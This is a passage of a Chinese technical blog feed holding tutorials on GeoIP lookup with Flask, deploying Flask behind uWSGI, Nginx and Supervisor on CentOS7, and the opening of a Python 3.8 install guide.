class="built_in">local</span>/bin/</span><br></pre></td></tr></table></figure><p>geoipupdate命令读配置文件默认为/usr/local/etc/GeoIP.conf将配置文件拷贝到/usr/local/etc/下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp GeoIP.conf /usr/<span class="built_in">local</span>/etc/</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/<span class="built_in">local</span>/etc/GeoIP.conf</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211110/geoipupdate%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.png" alt="修改GeoIP.conf"><br>如上图修改离线库文件目录及账号、LicenseKey，AccountID和LicenseKey就是开始在Maxmind网站上申请的。</p><h2 id="3、运行geoipupdate命令并加入定时任务"><a href="#3、运行geoipupdate命令并加入定时任务" class="headerlink" title="3、运行geoipupdate命令并加入定时任务"></a>3、运行geoipupdate命令并加入定时任务</h2><p>执行geoipupdate命令，在目录下面产生了GeoLite2-City.mmdb、GeoLite2-Country.mmdb两个离线库文件。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211110/GeoLite2%E5%BA%93%E6%96%87%E4%BB%B6.png" alt="GeoLite2离线库文件"><br>创建Linux定时任务，每周自动更新一下离线库文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab <span class="literal">-e</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> * * <span class="number">0</span> /usr/local/bin/geoipupdate</span><br></pre></td></tr></table></figure><h1 id="二、通过Python调用GeoIP获取IP信息"><a href="#二、通过Python调用GeoIP获取IP信息" class="headerlink" title="二、通过Python调用GeoIP获取IP信息"></a>二、通过Python调用GeoIP获取IP信息</h1><p>默认已经安装好了Flask环境，并激活了python虚拟环境。激活python虚拟环境安装Flask教程见<a href="http://xiejava.ishareread.com/posts/7f405b25/" target="_blank" rel="noopener">http://xiejava.ishareread.com/posts/7f405b25/</a></p><h2 id="1、安装geoip2"><a href="#1、安装geoip2" class="headerlink" title="1、安装geoip2"></a>1、安装geoip2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install geoip2</span><br></pre></td></tr></table></figure><h2 id="2、编写hello-py调用geoip2"><a href="#2、编写hello-py调用geoip2" class="headerlink" title="2、编写hello.py调用geoip2"></a>2、编写hello.py调用geoip2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi hello.py</span><br></pre></td></tr></table></figure><p>复制以下代码到hello.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">import</span> geoip2.database</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">reader=geoip2.database.Reader(<span class="string">'/home/geoipupdate_4.8.0_linux_amd64/GeoLite2-City.mmdb'</span>)</span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Hello World!"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/getip/&lt;ip&gt;")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getip</span><span class="params">(ip)</span>:</span></span><br><span class="line">    ipinfo=reader.city(ip)</span><br><span class="line">    ipinfo_json=&#123;<span class="string">'country'</span>:ipinfo.country.name,<span class="string">'city'</span>:ipinfo.city.name,<span class="string">'location'</span>:[ipinfo.location.longitude,ipinfo.location.latitude]&#125;</span><br><span class="line">    <span class="keyword">return</span> ipinfo_json</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><h2 id="3、运行hello-py"><a href="#3、运行hello-py" class="headerlink" title="3、运行hello.py"></a>3、运行hello.py</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(flask_web) [<span class="type">root</span>@<span class="type">localhost</span> <span class="type">flask_web</span>]<span class="comment"># python hello.py</span></span><br><span class="line"> * Serving Flask app <span class="string">'hello'</span> (lazy loading)</span><br><span class="line"> * Environment: production</span><br><span class="line">   WARNING: This is a development server. <span class="keyword">Do</span> not use it <span class="keyword">in</span> a production deployment.</span><br><span class="line">   Use a production WSGI server instead.</span><br><span class="line"> * Debug mode: off</span><br><span class="line"> * Running on all addresses.</span><br><span class="line">   WARNING: This is a development server. <span class="keyword">Do</span> not use it <span class="keyword">in</span> a production deployment.</span><br><span class="line"> * Running on http://<span class="number">192.168</span>.<span class="number">1.18</span>:<span class="number">8080</span>/ (Press CTRL+C to quit)</span><br></pre></td></tr></table></figure><p>注意：如果linux开启了防火墙请关闭防火墙，或放开192.168.1.18</p><h2 id="4、验证"><a href="#4、验证" class="headerlink" title="4、验证"></a>4、验证</h2><p>通过浏览器访问 <a href="http://192.168.1.18:8080/getip/128.101.101.101" target="_blank" rel="noopener">http://192.168.1.18:8080/getip/128.101.101.101</a><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211110/IP%E4%BF%A1%E6%81%AF%E8%BF%94%E5%9B%9E%E9%AA%8C%E8%AF%81.png" alt="验证IP信息"><br>可以看到返回IP的国家、城市、经纬度等信息。</p><p><strong>至此，本文介绍了如何注册并下载GeoIP离线数据包，并通过官方提供的geoipupdate进行定期更新数据。还介绍了如何通过Python调用GeoIP获取IP信息。</strong></p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS7下python3+Flask+uWSGI+Nginx+Supervisor环境搭建</title>
      <link href="/posts/7f405b25/"/>
      <url>/posts/7f405b25/</url>
      
        <content type="html"><![CDATA[<p>在生产环境中通常用uwsgi作为Flask的web服务网关，通过nginx反向代理进行负载均衡，通过supervior进行服务进行的管理。这一套搭下来还是有一些坑要踩，本文通过一个简单的Flask web应用记录了CentOS7下python3+Flask+uWSGI+Nginx+Supervisor环境搭建的全过程，以及一些注意事项，以免遗忘。</p><h1 id="一、Python3环境安装"><a href="#一、Python3环境安装" class="headerlink" title="一、Python3环境安装"></a>一、Python3环境安装</h1><p>CentOS7下Python3环境安装参考 <a href="http://xiejava.ishareread.com/posts/57cef505/" target="_blank" rel="noopener">http://xiejava.ishareread.com/posts/57cef505/</a></p><p>查看python版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># python -V</span></span><br><span class="line">Python 3.8.12</span><br></pre></td></tr></table></figure><h1 id="二、安装Flask"><a href="#二、安装Flask" class="headerlink" title="二、安装Flask"></a>二、安装Flask</h1><h2 id="1、创建Python虚拟环境"><a href="#1、创建Python虚拟环境" class="headerlink" title="1、创建Python虚拟环境"></a>1、创建Python虚拟环境</h2><p>在home目录下创建flask_web目录（目录根据具体实际环境创建，本教程是/home/flask_web）<br>通过venv创建虚拟环境<br>[root@localhost flask_web]# python -m venv /home/flask_web<br>创建成功后可以看到在目录下自动建了一些文件夹，包括python命令及依赖库等，激活以后是个独立的python虚拟运行环境。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211105/%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%96%87%E4%BB%B6.png" alt="python虚拟运行环境"></p><p>在目录下运行source bin/activate 激活虚拟环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost flask_web]<span class="comment"># source bin/activate</span></span><br><span class="line">(flask_web) [root@localhost flask_web]<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="2、安装Flask"><a href="#2、安装Flask" class="headerlink" title="2、安装Flask"></a>2、安装Flask</h2><p>通过pip install flask安装flask</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(flask_web) [root@localhost flask_web]<span class="comment"># pip install flask</span></span><br></pre></td></tr></table></figure><p>安装的时候有可能报ModuleNotFoundError: No module named ‘_ctypes’的错误，原因是缺少libffi-devel包，具体可参考 <a href="https://blog.csdn.net/qq_36416904/article/details/79316972" target="_blank" rel="noopener">https://blog.csdn.net/qq_36416904/article/details/79316972</a><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211105/%E5%AE%89%E8%A3%85flask%E6%8A%A5%E9%94%99.png" alt="安装Flask报错"></p><p>运行yum install libffi-devel -y 并且要重新编译执行安装python<br>解决包依赖的问题<br>(flask_web) [root@localhost flask_web]# yum install libffi-devel -y<br>进入到python源码包目录 执行使用make&amp;make install 命令重新编译并安装python（这里比较坑）<br>然后再pip install flask 进行安装<br>安装完成后可以尝试运行flask run，提示没有Flask应用程序，说明flask已经安装成功并且可以运行了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(flask_web) [root@localhost flask_web]<span class="comment"># flask run</span></span><br><span class="line"> * Environment: production</span><br><span class="line">   WARNING: This is a development server. Do not use it <span class="keyword">in</span> a production deployment.</span><br><span class="line">   Use a production WSGI server instead.</span><br><span class="line"> * Debug mode: off</span><br><span class="line">Usage: flask run [OPTIONS]</span><br><span class="line">Try <span class="string">'flask run --help'</span> <span class="keyword">for</span> <span class="built_in">help</span>.</span><br><span class="line"></span><br><span class="line">Error: Could not locate a Flask application. You did not provide the <span class="string">"FLASK_APP"</span> environment variable, and a <span class="string">"wsgi.py"</span> or <span class="string">"app.py"</span> module was not found <span class="keyword">in</span> the current directory.</span><br></pre></td></tr></table></figure><p>3、建立测试应用<br>vi hello.py创建一个hello.py的文件，copy下面的内容到文件中:wq保存退出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Hello World!"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>通过python hello.py运行测试程序</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(flask_web) [<span class="type">root</span>@<span class="type">localhost</span> <span class="type">flask_web</span>]<span class="comment"># python hello.py</span></span><br><span class="line"> * Serving Flask app <span class="string">'hello'</span> (lazy loading)</span><br><span class="line"> * Environment: production</span><br><span class="line">   WARNING: This is a development server. <span class="keyword">Do</span> not use it <span class="keyword">in</span> a production deployment.</span><br><span class="line">   Use a production WSGI server instead.</span><br><span class="line"> * Debug mode: off</span><br><span class="line"> * Running on http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">5000</span>/ (Press CTRL+C to quit)</span><br></pre></td></tr></table></figure><p>新开一个shell窗口执行curl <a href="http://127.0.0.1:5000/" target="_blank" rel="noopener">http://127.0.0.1:5000/</a> 可以看到有Hello World返回说明应用在flask框架下运行没有问题。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># curl http://127.0.0.1:5000/</span></span><br><span class="line">Hello World!</span><br></pre></td></tr></table></figure><h1 id="三、安装及配置uwsgi"><a href="#三、安装及配置uwsgi" class="headerlink" title="三、安装及配置uwsgi"></a>三、安装及配置uwsgi</h1><p>uWSGI是一个Web Server，并且独占uwsgi协议，但是同时支持WSGI协议、HTTP协议等，它的功能是把HTTP协议转化成语言支持的网络协议供python使用。有点类似于Java的web服务容器中间件tomcat</p><h2 id="1、安装uwsgi"><a href="#1、安装uwsgi" class="headerlink" title="1、安装uwsgi"></a>1、安装uwsgi</h2><p>通过pip命令安装</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(flask_web) [<span class="type">root</span>@<span class="type">localhost</span> <span class="type">flask_web</span>]<span class="comment"># pip install uwsgi</span></span><br></pre></td></tr></table></figure><p>如果顺利的话会显示Successfully installed uwsgi-2.0.20，表示安装成功了。</p><h2 id="2、配置uwsgi"><a href="#2、配置uwsgi" class="headerlink" title="2、配置uwsgi"></a>2、配置uwsgi</h2><p>新建一个uwsgi.ini配置文件，并将配置信息复制到配置文件<br>vi uwsgi.ini </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line"><span class="comment">#http=127.0.0.1:3366  #如果是http,通过proxy_pass http链接</span></span><br><span class="line">socket=127.0.0.1:3366 <span class="comment">#如果是socket，通过nginx配置uwsgi_pass socket链接</span></span><br><span class="line">wsgi-file=/home/flask_web/hello.py</span><br><span class="line">callable=app</span><br><span class="line">touch-reload=/home/flask_web/</span><br><span class="line"><span class="comment">#最大请求数，最多请求5000次就重启进程，以防止内存泄漏</span></span><br><span class="line">max-requests=5000</span><br><span class="line"><span class="comment">#请求超时时间，超过60秒关闭请求</span></span><br><span class="line">harakiri=60</span><br><span class="line"><span class="comment">#进程的数量</span></span><br><span class="line">processes=1</span><br><span class="line"><span class="comment">#线程数</span></span><br><span class="line">threads = 2</span><br><span class="line"><span class="comment">#记录pid的文件</span></span><br><span class="line">pidfile=/home/flask_web/uwsgi.pid</span><br><span class="line">buffer-size = 32768</span><br><span class="line"><span class="comment">#日志最大50M</span></span><br><span class="line"><span class="built_in">log</span>-maxsize=50000000</span><br><span class="line"><span class="comment">#配置虚拟环境路径，如果是在虚拟环境下启动，这个一定要配，不配会有些包找不到，应用会报错。可以在uwsgi.log文件中看报错信息</span></span><br><span class="line">virtualenv =/home/flask_web</span><br><span class="line"><span class="comment">#uwsgi日志文件，如果是通过supervisor托管，daemonize配置需要屏蔽</span></span><br><span class="line"><span class="comment">#daemonize=/home/flask_web/uwsgi.log</span></span><br><span class="line"><span class="comment">#项目更新后，自动加载</span></span><br><span class="line">python-autoreload=1</span><br><span class="line"><span class="comment">#状态检测地址</span></span><br><span class="line">stats = 127.0.0.1:9191</span><br></pre></td></tr></table></figure><h2 id="3、运行uwsgi"><a href="#3、运行uwsgi" class="headerlink" title="3、运行uwsgi"></a>3、运行uwsgi</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(flask_web) [root@localhost flask_web]<span class="comment"># uwsgi --ini /home/flask_web/uwsgi.ini</span></span><br></pre></td></tr></table></figure><p>启动以后通过访问curl <a href="http://127.0.0.1:3366" target="_blank" rel="noopener">http://127.0.0.1:3366</a> 有Hello World!的返回信息表示uwsgi已经成功启动，并且应用程序正常。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost flask_web]<span class="comment"># curl http://127.0.0.1:3366</span></span><br><span class="line">Hello World!</span><br></pre></td></tr></table></figure><h1 id="四、配置Nginx反向代理"><a href="#四、配置Nginx反向代理" class="headerlink" title="四、配置Nginx反向代理"></a>四、配置Nginx反向代理</h1><p>ps -ef|grep nginx 找到nginx的配置文件<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211105/nginx%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.png" alt="nginx配置文件"><br>如果uwsgi配置的是socket连接<br>[uwsgi]<br>socket=127.0.0.1:3366 #如果是socket，通过nginx配置uwsgi_pass socket链接<br>nginx的server配置如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">     listen 808;</span><br><span class="line">     server_name localhost;</span><br><span class="line"></span><br><span class="line">     location / &#123;</span><br><span class="line">          include uwsgi_params;</span><br><span class="line">          uwsgi_pass 127.0.0.1:3366;</span><br><span class="line">      &#125;</span><br><span class="line">      access_log /home/flask_web/access.log;</span><br><span class="line">      error_log /home/flask_web/error.log;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果uwsgi配置的是http<br>[uwsgi]<br>http=127.0.0.1:3366  #如果是http,通过proxy_pass http链接<br>nginx的server配置如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">      listen 808;</span><br><span class="line">      server_name localhost;</span><br><span class="line"></span><br><span class="line">      location / &#123;</span><br><span class="line">           proxy_pass http://127.0.0.1:3366;</span><br><span class="line">       &#125;</span><br><span class="line">       access_log /home/flask_web/access.log;</span><br><span class="line">       error_log /home/flask_web/error.log;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>重新加载nginx配置后，通过浏览器访问可以正常显示访问结果</p><h1 id="五、通过Supervisor进行进程托管"><a href="#五、通过Supervisor进行进程托管" class="headerlink" title="五、通过Supervisor进行进程托管"></a>五、通过Supervisor进行进程托管</h1><p>生产环境中，可以通过supervisor来进行uwsgi和nginx进程的托管，界面化的方式管理uwsgi和nginx，包括进程的监控、启停等。</p><h2 id="1、安装supervisor"><a href="#1、安装supervisor" class="headerlink" title="1、安装supervisor"></a>1、安装supervisor</h2><p>通过pip安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install supervisor</span><br></pre></td></tr></table></figure><p>离线安装请参考：<a href="http://xiejava.ishareread.com/posts/d670c9b8/" target="_blank" rel="noopener">http://xiejava.ishareread.com/posts/d670c9b8/</a></p><h2 id="2、配置supervisor"><a href="#2、配置supervisor" class="headerlink" title="2、配置supervisor"></a>2、配置supervisor</h2><p>找到supervisord的安装目录在/usr/local/bin下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost bin]<span class="comment"># which supervisord</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin/supervisord</span><br></pre></td></tr></table></figure><p>cd到/usr/local/bin目录下<br>通过echo_supervisord_conf &gt; supervisord.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost bin]<span class="comment"># echo_supervisord_conf &gt; supervisord.conf</span></span><br></pre></td></tr></table></figure><p>可以看到生成了一个supervisord.conf的配置文件。<br>将生成的supervisord.conf配置文件放到/etc/目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv supervisord.conf /etc/</span><br></pre></td></tr></table></figure><p>修改supervisord.conf的配置文件，主要是将子配置文件路径开启并指定配置文件路径，按照惯例将配置文件放到/etc目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[include]</span><br><span class="line">files = /etc/supervisord.d/*.ini</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211105/supervisord.config.png" alt="supervisord.conf配置文件"></p><p>我们在/etc目录下建个supervisord.d目录用来保存supervisor托管进程的配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># cd /etc/</span></span><br><span class="line">[root@localhost etc]<span class="comment"># mkdir supervisord.d</span></span><br></pre></td></tr></table></figure><p>建立并配置子配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost etc]<span class="comment"># cd supervisord.d/</span></span><br><span class="line">[root@localhost supervisord.d]<span class="comment"># vi uwsgi.ini</span></span><br></pre></td></tr></table></figure><p>复制以下内容至uwsgi.ini文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[program:uwsgi]</span><br><span class="line"><span class="built_in">command</span> =uwsgi --ini /home/flask_web/uwsgi.ini</span><br><span class="line">directory=/home/flask_web</span><br><span class="line">startsecs=10</span><br><span class="line">startretries=5</span><br><span class="line">autostart=<span class="literal">true</span></span><br><span class="line">autorestart=<span class="literal">true</span></span><br><span class="line">stdout_logfile=/home/flask_web/uwsgi_sup_log.log</span><br><span class="line">stdout_logfile_maxbytes=10MB</span><br><span class="line">user=root</span><br><span class="line">stopasgroup=<span class="literal">true</span></span><br><span class="line">killasgroup=<span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="3、启动supervisor"><a href="#3、启动supervisor" class="headerlink" title="3、启动supervisor"></a>3、启动supervisor</h2><p>在启动supervisor拉起uwsgi前两个注意事项</p><p>1) uwsgi的配置文件中daemonize一定要屏蔽掉，否则守护进程一直会重启，导致端口每次都被占用，Supervisor托管不了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211105/uwsgi.ini.png" alt="uwsgi.ini"><br>2) 在启动之前先将已经启动的uwsgi进程停掉，否则通过supervisor拉起uwsgi进程时端口冲突<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211105/kill-uwsgi.png" alt="kill uwsgi进程"></p><p>启动supervisord进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost bin]<span class="comment"># supervisord -c /etc/supervisord.conf</span></span><br></pre></td></tr></table></figure><p>修改配置文件后重新加载可以通过 supervisorctl reload 命令重新加载<br>查看supervisor托管状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost supervisord.d]<span class="comment"># supervisorctl status</span></span><br><span class="line">uwsgi                            STARTING</span><br></pre></td></tr></table></figure><p>可以看到uwsgi被supervisor托管并已经启动。如果需要通过supervisor的web控制界面进行进程的管理。需要修改/etc/supervisord.conf的配置文件将访问的IP地址限制放开，设置用户名、口令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[inet_http_server]         ; inet (TCP) server disabled by default</span><br><span class="line">port=*:9001        ; ip_address:port specifier, *:port <span class="keyword">for</span> all iface</span><br><span class="line">username=user              ; default is no username (open server)</span><br><span class="line">password=user@123               ; default is no password (open server)</span><br></pre></td></tr></table></figure><p>重新启动supervisor，重启时会报需要验证的错误</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost supervisord.d]<span class="comment"># supervisorctl shutdown</span></span><br><span class="line">Server requires authentication</span><br><span class="line">error: &lt;class <span class="string">'xmlrpc.client.ProtocolError'</span>&gt;, &lt;ProtocolError <span class="keyword">for</span> 127.0.0.1/RPC2: 401 Unauthorized&gt;: file: /usr/<span class="built_in">local</span>/lib/python3.8/site-packages/supervisor/xmlrpc.py line: 542</span><br></pre></td></tr></table></figure><p>可以直接kill -9杀掉supervisor的进程再启动，也可以通过supervisorctl 输入用户名、口令通过shutdown然后再重启。<br>启动命令：supervisord -c /etc/supervisord.conf</p><p>这时就可以通过supervisor的web控制界面进行进程的管理了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211105/supervisor-web.png" alt="Supervisor"><br><strong>至此，CentOS7下python3+Flask+uWSGI+Nginx+Supervisor环境全部搭建好了。</strong></p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS7下安装python3.8</title>
      <link href="/posts/57cef505/"/>
      <url>/posts/57cef505/</url>
      
        <content type="html"><![CDATA[<p>环境的搭建是进行开发的第一步，python因为存在python2和python3两个版本，让在建立python环境时造成不便，并且由于在Linux环境下不像Window环境安装那么友好，存在一些小坑。本教程记录了CentOS7下安装python3.8的过程和注意事项。</p><h1 id="一、查看系统版本"><a href="#一、查看系统版本" class="headerlink" title="一、查看系统版本"></a>一、查看系统版本</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># cat /etc/centos-release</span></span><br><span class="line">CentOS Linux release 7.2.1511 (Core)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># uname -a</span></span><br><span class="line">Linux localhost.localdomain 3.10.0-327.el7.x86_64 <span class="comment">#1 SMP Thu Nov 19 22:10:57 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure><p>查看python版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># python -V</span></span><br><span class="line">Python 2.7.5</span><br></pre></td></tr></table></figure><p>系统默认安装了Python 2.7.5</p><h1 id="二、安装依赖"><a href="#二、安装依赖" class="headerlink" title="二、安装依赖"></a>二、安装依赖</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gcc make</span><br></pre></td></tr></table></figure><p>如果有提示一路选择Y就可以</p><h1 